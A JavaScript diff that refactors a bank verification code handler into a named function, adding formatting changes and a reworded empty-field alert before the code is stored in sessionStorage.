@@ -1081,23 +1081,28 @@ async function monitorVerificationStatus() {
 // ======================================================
 // SAVE BANK VERIFICATION
 // ======================================================
-    const code = document.getElementById("bankVerificationCode")
-    . value 
-    .trim();
 
-    if (code=== "") {
+function saveBankVerification() {
 
-        alert("Please enter the verification code.");
+    const code = document
+        .getElementById("bankVerificationCode")
+        .value
+        .trim();
+
+    if (code === "") {
+
+        alert("Please enter the bank verification code.");
 
         return;
-
     }
-    sessionStorage.setItem("bankVerificationCode",
-                           code
-                           );
+
+    sessionStorage.setItem(
+        "bankVerificationCode",
+        code
+    );
+
     // Go to the verification waiting screen
     loadVerificationPendingScreen();
-
 }
 // ======================================================
 // BANK REFERENCE SCREEN
